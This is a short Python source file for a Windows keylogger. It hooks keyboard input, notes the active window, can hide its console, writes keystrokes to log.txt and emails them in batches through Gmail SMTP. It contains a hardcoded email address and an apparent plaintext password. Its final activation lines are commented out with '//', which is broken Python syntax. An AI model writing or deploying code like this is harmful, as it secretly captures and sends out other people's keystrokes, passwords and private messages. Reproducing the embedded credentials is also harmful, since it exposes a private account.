import pythoncom, pyHook
import win32api
import win32con
import win32event, winerror
from threading import Timer
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

data = ""
windowname = ""
lastwindow = None
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print ("Multiple Instance not Allowed")
    exit(0)
	
	
	
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True	

def write_to_file(data):
	logfile = open("log.txt","a+")
	logfile.write(data)
	logfile.close()
	return 1;
	
def send_mail(data):
	fromaddr = "sushanthrao6@gmail.com"
	toaddr = "sushanthrao6@gmail.com"
	msg = MIMEMultipart()
	msg['From'] = fromaddr
	msg['To'] = toaddr
	msg['Subject'] = "keylogger" 
	body = data
	msg.attach(MIMEText(body, 'plain'))
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.starttls()
	server.login(fromaddr, "9640807999sushanth")
	text = msg.as_string()
	server.sendmail(fromaddr, toaddr, text)
	server.quit()
	

def OnKeyboardEvent(event):
	global data
	global windowname
	global lastwindow
	temp = event.Key
	windowname = event.WindowName
	if windowname!=lastwindow:
		data = data + "\n::" + windowname + "::"
		lastwindow = windowname
	if event.KeyID == 32:
		temp = " "
	if event.KeyID == 8:
		data = data[:-1]
		temp=""
	if event.KeyID == 13:
		temp = "\n"
	
	data = data+temp
	if len(data) >= 100:
		print(data)
		write_to_file(data)
		send_mail(data)
		data = ""
	
	return True

//hide()
# create a hook manager
//hm = pyHook.HookManager()
# watch for all mouse events
//hm.KeyDown = OnKeyboardEvent
# set the hook
//hm.HookKeyboard()
# wait forever
//pythoncom.PumpMessages()